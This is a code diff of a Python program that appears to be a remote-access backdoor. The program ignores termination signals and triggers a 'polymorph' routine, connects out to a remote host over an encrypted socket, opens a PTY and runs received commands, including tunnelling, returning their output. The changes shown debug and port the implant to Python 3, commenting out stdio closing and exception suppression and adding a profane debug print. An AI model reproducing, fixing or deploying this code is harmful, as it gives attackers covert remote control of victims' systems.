@@ -52,8 +52,8 @@ def main():
 def shield():
     for sig in [signal.SIGHUP, signal.SIGINT, signal.SIGABRT, signal.SIGQUIT, signal.SIGTERM]:
         signal.signal(sig, sh)
-    for fd in [sys.stdin, sys.stdout, sys.stderr]:
-        os.close(fd.fileno())
+    # for fd in [sys.stdin, sys.stdout, sys.stderr]:
+    #     os.close(fd.fileno())
 
 def sh(a, b):
     polymorph()
@@ -75,7 +75,7 @@ def refresh_hdb():
         return False
 
 def get_hostkey(host):
-    global hdb, exp
+    global hdb
     if 'keys' not in hdb:
         return False
     hkdb = hdb['keys']
@@ -87,7 +87,7 @@ def get_hostkey(host):
         return False
     try:
         return {'n': int(hostent['n']),
-                'e': int(hostent['e']) if 'e' in hostent else exp}
+                'e': int(hostent['e']) if 'e' in hostent else Crypto.exp}
     except:
         del hkdb[host]
         return False
@@ -147,8 +147,8 @@ def run_pty(sock):
                 sock.send(b'\xc0\xdenpty')
                 pty_barrier(sock)
                 return True
-    except:
-        return False
+    #except:
+    #    return False
     finally:
         sel.close()
         try:
@@ -157,7 +157,7 @@ def run_pty(sock):
             pass
 
 def work(h_addr, port, privkey, bits):
-    global server_modulus, exp
+    global server_modulus
     try:
         host = socket.gethostbyname(h_addr)
     except:
@@ -171,14 +171,15 @@ def work(h_addr, port, privkey, bits):
         if hostkey:
             rpubkey = hostkey
         else:
-            rpubkey = {'n': server_modulus, 'e': exp}
+            rpubkey = {'n': server_modulus, 'e': Crypto.exp}
         if not sock.handshake_server(rpubkey):
+            print('fucc')
             return True
 
         PS1 = '$ '
         if 'PS1' in os.environ:
             PS1 = os.environ['PS1']
-        sock.send(PS1)
+        sock.send(bytes(PS1, 'utf-8'))
         while True:
             cmd = sock.recv()
             if cmd == b'tunnel':
@@ -205,9 +206,9 @@ def work(h_addr, port, privkey, bits):
                         response = str(response, 'utf-8')
                 except Exception as e:
                     response = '%s\n' % str(e)
-            sock.send('%s%s' % (response, PS1))
-    except:
-        return True
+            sock.send(bytes('%s%s' % (response, PS1), 'utf-8'))
+    #except:
+    #    return True
     finally:
         raw_sock.close()
 
